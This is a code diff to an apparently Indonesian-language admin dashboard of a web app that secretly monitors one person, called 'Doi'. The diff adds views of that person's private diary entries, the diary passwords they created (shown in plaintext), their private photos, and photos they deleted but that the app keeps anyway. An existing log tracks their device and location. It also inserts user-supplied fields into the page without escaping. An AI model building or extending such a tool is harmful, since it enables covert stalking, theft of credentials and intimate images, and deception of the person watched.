@@ -90,6 +90,7 @@
             <thead>
                 <tr>
                     <th>Waktu</th>
+                    <th>Nama Input</th>
                     <th>Perangkat</th>
                     <th>Browser / OS</th>
                     <th>Status Lokasi</th>
@@ -98,6 +99,83 @@
             </thead>
             <tbody id="log-body">
                 <tr><td colspan="5" style="text-align: center;">Memuat data...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Secret Notes Table -->
+    <div class="admin-container" style="margin-top: 20px;">
+        <div class="admin-header">
+            <h1 class="admin-title">Password Buku Harian 🔑</h1>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th>Waktu Dibuat</th>
+                    <th>Nama</th>
+                    <th>Password yang Dibuat</th>
+                </tr>
+            </thead>
+            <tbody id="passwords-body">
+                <tr><td colspan="3" style="text-align: center;">Memuat data...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1 class="admin-title">Buku Harian Doi 🔒</h1>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 20%;">Waktu</th>
+                    <th style="width: 15%;">Nama</th>
+                    <th style="width: 65%;">Isi Tulisan</th>
+                </tr>
+            </thead>
+            <tbody id="notes-body">
+                <tr><td colspan="3" style="text-align: center;">Memuat data...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Private Photos Table -->
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1 class="admin-title">Galeri Privat Doi 📸</h1>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 20%;">Waktu Upload</th>
+                    <th style="width: 15%;">Nama</th>
+                    <th style="width: 65%;">Pratinjau Foto</th>
+                </tr>
+            </thead>
+            <tbody id="private-photos-body">
+                <tr><td colspan="3" style="text-align: center;">Memuat data...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Deleted Photos Table -->
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1 class="admin-title">Log Foto yang Dihapus 🗑️</h1>
+            <span style="font-size: 12px; color: #888;">Foto ini dihapus oleh user, tapi tetap tersimpan di sini.</span>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 20%;">Waktu Upload</th>
+                    <th style="width: 15%;">Nama</th>
+                    <th style="width: 15%;">Jenis</th>
+                    <th style="width: 50%;">Pratinjau Foto</th>
+                </tr>
+            </thead>
+            <tbody id="deleted-photos-body">
+                <tr><td colspan="4" style="text-align: center;">Memuat data...</td></tr>
             </tbody>
         </table>
     </div>
@@ -154,6 +232,7 @@
 
                     tr.innerHTML = `
                         <td>${timeStr}</td>
+                        <td><strong>${data.enteredName || '-'}</strong></td>
                         <td><strong>${data.device || '-'}</strong></td>
                         <td style="font-size: 11px; max-width: 200px;">${data.userAgent || '-'}</td>
                         <td><span class="status-badge ${statusClass}">${data.locationStatus || '-'}</span></td>
@@ -163,11 +242,144 @@
                 });
             } catch (e) {
                 console.error("Gagal mengambil log:", e);
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: red;">Gagal memuat data: ${e.message}</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: red;">Gagal memuat data: ${e.message}</td></tr>`;
+            }
+        }
+
+        async function fetchNotes() {
+            const tbody = document.getElementById('notes-body');
+            try {
+                const q = query(collection(db, "secret_notes"), orderBy("timestamp", "desc"));
+                const querySnapshot = await getDocs(q);
+                
+                tbody.innerHTML = "";
+                
+                if (querySnapshot.empty) {
+                    tbody.innerHTML = '<tr><td colspan="3" style="text-align: center;">Belum ada coretan catatan pribadi.</td></tr>';
+                    return;
+                }
+
+                querySnapshot.forEach((doc) => {
+                    const data = doc.data();
+                    const tr = document.createElement('tr');
+                    
+                    let timeStr = "-";
+                    if (data.timestamp) {
+                        const date = data.timestamp.toDate ? data.timestamp.toDate() : new Date(data.timestamp);
+                        timeStr = date.toLocaleString('id-ID');
+                    }
+
+                    const safeText = data.text ? data.text.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\n/g, "<br>") : "-";
+
+                    tr.innerHTML = `
+                        <td>${timeStr}</td>
+                        <td><strong>${data.enteredName || '-'}</strong></td>
+                        <td style="font-size: 13px; font-family: 'Inter', sans-serif; line-height: 1.4;">${safeText}</td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error("Gagal mengambil catatan:", e);
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: red;">Gagal memuat catatan: ${e.message}</td></tr>`;
+            }
+        }
+
+        async function fetchPasswords() {
+            const tbody = document.getElementById('passwords-body');
+            try {
+                const q = query(collection(db, "diary_credentials"), orderBy("timestamp", "desc"));
+                const querySnapshot = await getDocs(q);
+                
+                tbody.innerHTML = "";
+                
+                if (querySnapshot.empty) {
+                    tbody.innerHTML = '<tr><td colspan="3" style="text-align: center;">Belum ada password yang dibuat.</td></tr>';
+                    return;
+                }
+
+                querySnapshot.forEach((doc) => {
+                    const data = doc.data();
+                    const tr = document.createElement('tr');
+                    
+                    let timeStr = "-";
+                    if (data.timestamp) {
+                        const date = data.timestamp.toDate ? data.timestamp.toDate() : new Date(data.timestamp);
+                        timeStr = date.toLocaleString('id-ID');
+                    }
+
+                    tr.innerHTML = `
+                        <td>${timeStr}</td>
+                        <td><strong>${data.enteredName || '-'}</strong></td>
+                        <td style="font-size: 13px; font-weight: bold; color: #d81b60;">${data.password || '-'}</td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error("Gagal mengambil password:", e);
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: red;">Gagal memuat data: ${e.message}</td></tr>`;
+            }
+        }
+
+        async function fetchPhotos() {
+            const privateBody = document.getElementById('private-photos-body');
+            const deletedBody = document.getElementById('deleted-photos-body');
+            try {
+                const q = query(collection(db, "photos"), orderBy("timestamp", "desc"));
+                const querySnapshot = await getDocs(q);
+                
+                privateBody.innerHTML = "";
+                deletedBody.innerHTML = "";
+                
+                let privateCount = 0;
+                let deletedCount = 0;
+
+                querySnapshot.forEach((doc) => {
+                    const data = doc.data();
+                    const tr = document.createElement('tr');
+                    
+                    let timeStr = "-";
+                    if (data.timestamp) {
+                        const date = data.timestamp.toDate ? data.timestamp.toDate() : new Date(data.timestamp);
+                        timeStr = date.toLocaleString('id-ID');
+                    }
+
+                    const imgHtml = `<img src="${data.imageData}" style="height: 100px; border-radius: 8px; border: 1px solid #ccc; object-fit: cover; cursor: pointer;" onclick="window.open('${data.imageData}')">`;
+
+                    if (data.deleted) {
+                        deletedCount++;
+                        const typeLabel = data.isPrivate ? '<span style="color: #d81b60; font-weight: bold;">Privat</span>' : '<span style="color: #1976d2; font-weight: bold;">Publik</span>';
+                        tr.innerHTML = `
+                            <td>${timeStr}</td>
+                            <td><strong>${data.enteredName || '-'}</strong></td>
+                            <td>${typeLabel}</td>
+                            <td>${imgHtml}</td>
+                        `;
+                        deletedBody.appendChild(tr);
+                    } else if (data.isPrivate) {
+                        privateCount++;
+                        tr.innerHTML = `
+                            <td>${timeStr}</td>
+                            <td><strong>${data.enteredName || '-'}</strong></td>
+                            <td>${imgHtml}</td>
+                        `;
+                        privateBody.appendChild(tr);
+                    }
+                });
+
+                if (privateCount === 0) privateBody.innerHTML = '<tr><td colspan="3" style="text-align: center;">Belum ada foto privat.</td></tr>';
+                if (deletedCount === 0) deletedBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Belum ada foto yang dihapus.</td></tr>';
+
+            } catch (e) {
+                console.error("Gagal mengambil foto:", e);
+                privateBody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: red;">Gagal memuat data: ${e.message}</td></tr>`;
+                deletedBody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: red;">Gagal memuat data: ${e.message}</td></tr>`;
             }
         }
 
         fetchLogs();
+        fetchNotes();
+        fetchPasswords();
+        fetchPhotos();
     </script>
 </body>
 </html>
